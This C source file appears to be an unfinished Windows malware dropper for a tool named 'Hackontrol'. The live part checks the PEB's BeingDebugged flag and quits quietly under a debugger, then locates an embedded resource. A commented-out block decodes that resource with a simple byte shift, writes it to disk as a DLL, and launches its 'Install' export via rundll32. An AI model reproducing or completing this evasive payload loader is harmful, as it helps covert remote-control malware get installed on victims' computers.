#include <stdio.h>
#include <Windows.h>
#include "resource.h"

typedef struct {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
} *PPEB;

static void displayError(const LPCWSTR function, const DWORD code) {

}

int main(int argc, char** argv) {
	PPEB block = (PPEB) __readgsqword(0x60);

	if(block && block->BeingDebugged) {
		return 0;
	}

	printf("Finding resource\n");
	HRSRC handle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!handle) {
		displayError(L"FindResourceW", GetLastError());
		return 1;
	}

	printf("Finished\n");
	return 0;
}

/*#include <libkhopan.h>
#include <libhackontrol.h>
#include "resource.h"

#define FUNCTION_LIBDLL32 "Install"

int main(int argc, char** argv) {
	DWORD size = SizeofResource(NULL, handle);

	if(!size) {
		KHOPANLASTERRORMESSAGE_WIN32(L"SizeofResource");
		return 1;
	}

	printf("Resource size: %lu bytes\nLoading resource\n", size);
	HGLOBAL resource = LoadResource(NULL, handle);

	if(!resource) {
		KHOPANLASTERRORMESSAGE_WIN32(L"LoadResource");
		return 1;
	}

	PBYTE data = LockResource(resource);

	if(!data) {
		KHOPANLASTERRORMESSAGE_WIN32(L"LockResource");
		return 1;
	}

	PBYTE buffer = LocalAlloc(LMEM_FIXED, size);

	if(!buffer) {
		KHOPANLASTERRORMESSAGE_WIN32(L"LocalAlloc");
		return 1;
	}

	printf("Allocate memory: %lu bytes\n", size);
	DWORD error;

	for(error = 0; error < size; error++) {
		buffer[error] = (data[error] - 18) % 0xFF;
	}

	LPWSTR folderHackontrol = HackontrolGetHomeDirectory();

	if(!folderHackontrol) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolGetHomeDirectory");
		LocalFree(buffer);
		return 1;
	}

	if(!HackontrolCreateDirectory(folderHackontrol)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolCreateDirectory");
		LocalFree(folderHackontrol);
		LocalFree(buffer);
		return 1;
	}

	LPWSTR fileLibdll32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBDLL32, folderHackontrol);
	error = GetLastError();
	LocalFree(folderHackontrol);

	if(!fileLibdll32) {
		KHOPANERRORMESSAGE_WIN32(error, L"KHOPANFormatMessage");
		LocalFree(buffer);
		return 1;
	}

	BOOL result = HackontrolWriteFile(fileLibdll32, buffer, size);
	error = GetLastError();
	LocalFree(buffer);

	if(!result) {
		KHOPANERRORMESSAGE_WIN32(error, L"HackontrolWriteFile");
		LocalFree(fileLibdll32);
		return 1;
	}

	printf("Loading DLL\n");
	result = KHOPANExecuteRundll32Function(fileLibdll32, FUNCTION_LIBDLL32, NULL, TRUE);
	error = GetLastError();
	LocalFree(fileLibdll32);

	if(!result) {
		KHOPANERRORMESSAGE_WIN32(error, L"KHOPANExecuteRundll32Function");
		return 1;
	}

	return 0;
}*/
